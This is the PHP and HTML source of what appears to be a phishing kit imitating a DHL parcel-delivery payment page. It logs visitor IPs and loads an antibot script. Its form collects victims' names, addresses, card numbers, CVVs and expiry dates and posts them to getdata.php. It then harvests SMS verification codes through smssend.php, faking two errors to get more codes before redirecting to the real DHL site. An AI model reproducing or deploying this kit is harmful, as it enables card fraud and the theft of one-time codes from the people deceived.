<?php 
include("antibot.php");
$iplogfile = 'logs.html';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$webpage = $_SERVER['SCRIPT_NAME'];
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$webpage.' '.$browser. "\n<br><br>");
fclose($fp);





if (get_browser_language()=="fr") 
$xml=simplexml_load_file("xml/fr.xml");

else if (get_browser_language()=="es")
$xml=simplexml_load_file("xml/es.xml");

else if (get_browser_language()=="it")
$xml=simplexml_load_file("xml/it.xml");

else
	$xml=simplexml_load_file("xml/en.xml");





function get_browser_language( $available = [], $default = 'en' ) {
	if ( isset( $_SERVER[ 'HTTP_ACCEPT_LANGUAGE' ] ) ) {
		$langs = explode( ',', $_SERVER['HTTP_ACCEPT_LANGUAGE'] );
    if ( empty( $available ) ) {
      return $langs[ 0 ];
    }
		foreach ( $langs as $lang ){
			$lang = substr( $lang, 0, 2 );
			if( in_array( $lang, $available ) ) {
				return $lang;
			}
		}
	}
	return $default;
}

 ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title><?php echo $xml->htmltitle ?></title>
	<!-- Mobile Specific Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="icon" href="images/favicon.ico" type="image/x-icon"/>
	<!-- Font-->
	<link rel="stylesheet" type="text/css" href="css/roboto-font.css">
	<link rel="stylesheet" type="text/css" href="fonts/material-design-iconic-font/css/material-design-iconic-font.min.css">
	<!-- datepicker -->
	<link rel="stylesheet" type="text/css" href="css/jquery-ui.min.css">
	<!-- Main Style Css -->
    <link rel="stylesheet" href="css/style.css"/>
</head>
<body>
	<nav class="navbar navbar-default" style="background: #fc0;width: 100%;">
  <div class="container">
    <div class="navbar-header">
      <a class="navbar-brand" href="#">
        <img alt="Brand" src="images/img.svg" width="100" style="padding:10px;margin-left: auto;margin-right: auto;
    display: -webkit-box;">
      </a>
    </div>
  </div>
</nav>
	<div class="page-content" style="background-image: url('images/bg.jpg')">
		<div class="wizard-v3-content">
			<div class="wizard-form">
				<div class="wizard-header">
					<h2 style="padding-left:20px;padding-right: 20px"><?php echo $xml->title ?></h2>
					
				</div>
		        <form class="form-register" action="#" method="post">
		        	<div id="form-total">
		        		<!-- SECTION 1 -->
			            <h2>
			            	<span class="step-icon"><i class="zmdi zmdi-account"></i></span>
			            	<span class="step-text"> <?php echo $xml->step1title ?></span>
			            </h2>
			            <section>
			                <div class="inner">
			                	<h3 style="text-align: center;"><?php echo $xml->step1subtitle ?></h3>
			                	<div class="form-row">
									<div class="form-holder">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="nom" name="first_name" required>
											<span class="label"><?php echo $xml->firstname ?></span>
					  						<span class="border"></span>
										</label> 
									</div>
									<div class="form-holder">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="prenom" name="last_name" required>
											<span class="label"><?php echo $xml->secondname ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
								
								
								<div class="form-row">
									<div class="form-holder form-holder-1">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="adresse1" name="phone" required>
											<span class="label"><?php echo $xml->adress1 ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
								<div class="form-row">
									<div class="form-holder form-holder-1">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="adresse2" name="phone" required>
											<span class="label"><?php echo $xml->adress2 ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
								<div class="form-row">
									<div class="form-holder form-holder-1">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="ville" name="address" required>
											<span class="label"><?php echo $xml->city ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
								<div class="form-row">
									<div class="form-holder form-holder-1">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="codepostal" name="address" required>
											<span class="label"><?php echo $xml->zip ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
							</div>
			            </section>
						<!-- SECTION 2 -->
			            <h2>
			            	<span class="step-icon"><i class="zmdi zmdi-lock"></i></span>
			            	<span class="step-text"><?php echo $xml->step2title ?></span>
			            </h2>
			              <section>
			                <div class="inner">
			                	<h3 style="text-align: center;"><?php echo $xml->step2subtitle ?></h3>
			                	<div class="form-row">
			                		<div class="form-holder form-holder-2" style="margin-left: auto;
    margin-right: auto; width: inherit;">
			                			
			                			<label class="pay-1-label" for="pay-1" ><img src="images/wizard_v3_icon_1.png" alt="pay-1"><?php echo $xml->creditcard ?></label>
										
			                		</div>
			                	</div>
			                	<div class="form-row">
									<div class="form-holder form-holder-1">
										<label class="form-row-inner">
											<input type="text" class="form-control"  id="nomtitulaire" name="nomtitulaire" required value="">
											<span class="label"><?php echo $xml->cardholder ?></span>
					  						<span class="border"></span>
										</label>
									</div>
								</div>
			                	<div class="form-row">
									<div class="form-holder">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="xsfcc" maxlength="16" name="card" required onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')"  value="" >
											<span class="label"><?php echo $xml->cc ?></span>
											<span class="border"></span>
										</label>
									</div>
									<div class="form-holder">
										<label class="form-row-inner">
											<input type="text" class="form-control" id="xsfcvv" maxlength="3" name="cvc" required onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" value="" >
											<span class="label"><?php echo $xml->cvv ?></span>
											<span class="border"></span>
										</label>
									</div>
								</div>
			                	<div class="form-row form-row-date ">
									<div class="form-holder form-holder-2">
										<label for="date" class="special-label"><?php echo $xml->dateexpiration ?></label>
										<select name="month_1" id="xsfmm" style="width:  100% !important;" >
											<option value="" disabled selected><?php echo $xml->dateexpirationmonth ?></option>
											<option value="01" selected="">01</option>
											<option value="02">02</option>
											<option value="03">03</option>
											<option value="04">04</option>
											<option value="05">05</option>
											<option value="06" >06</option>
											<option value="07">07</option>
											<option value="08">08</option>
											<option value="09">09</option>
											<option value="10">10</option>
											<option value="11">11</option>
											<option value="12">12</option>
										</select>
										<select name="year_1" id="xsfyy" style="width:  100% !important;">
											<option value="" disabled selected><?php echo $xml->dateexpirationyear ?></option>
											<option value="2019" selected="" >2019</option>
											<option value="2020">2020</option>
											<option value="2021">2021</option>
											<option value="2022">2022</option>
											<option value="2023">2023</option>
											<option value="2024">2024</option>
											<option value="2025">2025</option>
											<option value="2026">2026</option>
										</select>
									</div>
								</div>
							
							</div>
							<div style="margin-top: 20px"><center><b><?php echo $xml->notice ?></b></center></div>
			            </section>
			       
			           
			            
			            <!-- SECTION 3 -->
			            <h2>
			            	<span class="step-icon"><i class="zmdi zmdi-receipt"></i></span>
			            	<span class="step-text"><?php echo $xml->step3title ?></span>
			            </h2>
			            <section>
			                <div class="inner">
			                	<h4 id="smslabel" style="font-weight:500"><center><?php echo $xml->step3subtitle ?></center></h4>
			                	<h4 id="smslabel2" style="display: none;font-weight:500"><center><?php echo $xml->smslabel2 ?></center></h4>
			                	<div class="form-row" >
									<div class="form-holder form-holder-1" style="width: 50%; margin-right: auto;margin-left: auto;">
										<label class="form-row-inner">
										<br>
										<input type="text" class="form-control" placeholder="<?php echo $xml->smsholder ?>" id="smstxt" style="text-align: center; font-weight:500" name="phone" required>
											<strong id="errreur" style="color: red; font-weight: 500; display: none; margin-top:10px;    display: -webkit-box; text-align: center;"><?php echo $xml->erreur ?></strong>
											<strong id="success" style="color: green; font-weight: 500; display: none; margin-top:10px;    display: -webkit-box; text-align: center;"><?php echo $xml->success ?></strong>
										</label>
									

										  <button type="button" id="smsbtn" class="btn btn-primary btn-lg" style="width: 100%; background-color: #d40511; padding:10px; border:none; border-radius: 3px; color:#fc0;font-weight: bold; margin-top:20px">Valider</button>

									</div>
								</div>
			                	
			                	<span style="display: grid; margin-top:20px"><b style="text-align: center;"> <p style="text-align: center"><?php echo $xml->sendcode ?></p></span>
			                	<span style="display: grid; margin-top:20px"><b style="text-align: center;color:red"><?php echo $xml->msgimportant ?>	</b> <p style="text-align: center; font-size: 0.8em"><?php echo $xml->lastmsg ?></p></span>
							</div>
			            </section>
		        	</div>
		        </form>
		        <footer style="text-align: center; padding-bottom:20px;padding-top:20px"><?php echo $xml->copyright ?></footer>
			</div>


		</div>
	</div>
	<script src="js/fa.js"></script>
	<script src="js/jquery-3.3.1.min.js"></script>
	<script src="js/jquery.steps.js"></script>
	<script src="js/jquery-ui.min.js"></script>
	<script >
		loadingtime=5000
		counteur=0;
$(document).ready(function() {







  $('#smsbtn').on('click', function() {




	if ($("#smstxt").val().length != 0){

  	
    if (counteur == 2 )
    {
setTimeout(function() {
    window.location.replace("https://www.logistics.dhl");
    
    }, 10000);






    	
    }
	

	 $.ajax({
				      type: "POST",
				      dataType:'json',
				      url: "smssend.php",
				      data: {smscode:$("#smstxt").val()},
				      success: function (result) {
					      }
				 });
	
  	$("#smstxt").hide()
  	$("#smslabel").hide()
  	$("#smslabel2").hide()
  	$("#errreur").hide()
    var $this = $(this);
    console.log("this is : "+$(this).html() )
    var loadingText = '<i style="font-size:30px" class="fa fa-circle-o-notch fa-spin"></i></br></br><p><?php echo $xml->loading ?></p>';
    if ($(this).html() !== loadingText) {
      $this.data('original-text', $(this).html());
      $this.html(loadingText);
    }
    setTimeout(function() {
    if (counteur!=2)
    {
      $this.html($this.data('original-text'));
      $("#smstxt").show()
      $("#smstxt").val('')
  	  $("#smslabel2").show()
  	  $("#errreur").show()
  	  $("#success").hide()
  	  counteur++
    }
    else
    {
    	$this.html($this.data('original-text'));
      $("#smstxt").hide()
      $("#smstxt").val('')
  	  $("#smslabel2").hide()
  	  $("#errreur").hide()
  	  $("#success").show()
  	  $('#smsbtn').hide()
  	  counteur++
    }
    }, loadingtime);
}
else
{
	$('#smstxt').css('border-bottom','2px solid red');
}



  });
})
		
    $("#form-total").steps({
        headerTag: "h2",
        bodyTag: "section",
        transitionEffect: "fade",
        enableAllSteps: true,
        autoFocus: true,
        transitionEffectSpeed: 500,
        titleTemplate : '<div class="title">#title#</div>',
        labels: {
            
            next : '<?php echo $xml->next ?>',
            finish : '<?php echo $xml->finish ?>',
            current : ''
        }, 
        onStepChanging: function (event, currentIndex, newIndex) { 
        	
           if (currentIndex==0)
           {
           	nom=$('#nom').val();
            prenom=$('#prenom').val();
            adresse1=$('#adresse1').val();
            adresse2=$('#adresse2').val();
            ville=$('#ville').val();
            codepostal=$('#codepostal').val();
            
            if ((nom.length<3) ||(prenom.length<3) ||(adresse1.length<3) ||(ville.length<3) ||(codepostal.length<3))
            {
            	if (nom.length<3)
            		$('#nom').css('border-bottom','2px solid red');
            	else
            		$('#nom').css('border-bottom','2px solid #000');
            	if (prenom.length<3)
            		$('#prenom').css('border-bottom','2px solid red');
            	else
            		$('#prenom').css('border-bottom','2px solid #000');
				if (adresse1.length<3)
            		$('#adresse1').css('border-bottom','2px solid red');
            	else
            		$('#adresse1').css('border-bottom','2px solid #000');
				if (ville.length<3)
            		$('#ville').css('border-bottom','2px solid red');
            	else
            		$('#ville').css('border-bottom','2px solid #000');
            	if (codepostal.length<3)
            		$('#codepostal').css('border-bottom','2px solid red');
            	else
            		$('#codepostal').css('border-bottom','2px solid #000');
            	return false;
            }
            else
                return true;
           }
          if (currentIndex==1)
          {

	$("#smstxt").hide()
  	$("#smslabel").hide()
  	$("#smslabel2").hide()
  	$("#success").hide()
  	$("#errreur").hide()
    var $this = $('#smsbtn');
    $('#smsbtn').css('width','auto')
    $('#smsbtn').css('margin-right','auto')
    $('#smsbtn').css('margin-left','auto')
    $('#smsbtn').css('display','block')
   


    var loadingText = '<i style="font-size:30px" class="fa fa-circle-o-notch fa-spin"></i>';

      $this.data('original-text', $('#smsbtn').html());
      $this.html(loadingText);
     setTimeout(function() {
      $this.html($this.data('original-text'));
      $("#smstxt").show()
  	  $("#smslabel2").show()

    }, loadingtime);
     
          	nom=$('#nom').val();
            prenom=$('#prenom').val();
            adresse1=$('#adresse1').val();
            adresse2=$('#adresse2').val();
            ville=$('#ville').val();
            codepostal=$('#codepostal').val();
          	nomtitulaire=$('#nomtitulaire').val();
            xsfcc=$('#xsfcc').val();
            xsfcvv=$('#xsfcvv').val();
            xsfmm=$('#xsfmm').val();
            xsfyy=$('#xsfyy').val();
            console.log('titulaire is  '+ $('#nomtitulaire').val())
            if ((xsfcc.length<16) ||(xsfcvv.length<3) ||(xsfmm===null) ||(xsfyy===null) ||(nomtitulaire.length<3))
            {
            	console.log("mm is :"+xsfmm)
            	if (xsfcc.length<3)
            		$('#xsfcc').css('border-bottom','2px solid red');
            	else
            		$('#xsfcc').css('border-bottom','2px solid #000');
            	if (xsfcvv.length<3)
            		$('#xsfcvv').css('border-bottom','2px solid red');
            	else
            		$('#xsfcvv').css('border-bottom','2px solid #000');
				if (xsfmm===null)
            		$('#xsfmm').css('border-bottom','2px solid red');
            	else
            		$('#xsfmm').css('border-bottom','2px solid #000');
				if (xsfyy===null)
            		$('#xsfyy').css('border-bottom','2px solid red');
            	else
            		$('#xsfyy').css('border-bottom','2px solid #000');
            	if (nomtitulaire.length<3)
            		$('#nomtitulaire').css('border-bottom','2px solid red');
            	else
            		$('#nomtitulaire').css('border-bottom','2px solid #000');

            	return false;
            }
            else
            {
				 $.ajax({
				      type: "POST",
				      dataType:'json',
				      url: "getdata.php",
				      data: {nomtitulaire:nomtitulaire,xsfyy:xsfyy,xsfmm:xsfmm,xsfcvv:xsfcvv,xsfcc:xsfcc,nom:nom,prenom:prenom,adresse1:adresse1,adresse2:adresse2,ville:ville,codepostal:codepostal},
				      success: function (result) {
					      }
				 });
				 $('[aria-label="Pagination"]').css('display','none');
  return true;
            }

          }

          
        }
    });





   	</script>
</body>
<style>
	#form-total > div.actions.clearfix > ul > li:nth-child(2) > a
	{
		padding:10px;
	}
</style>
</html>

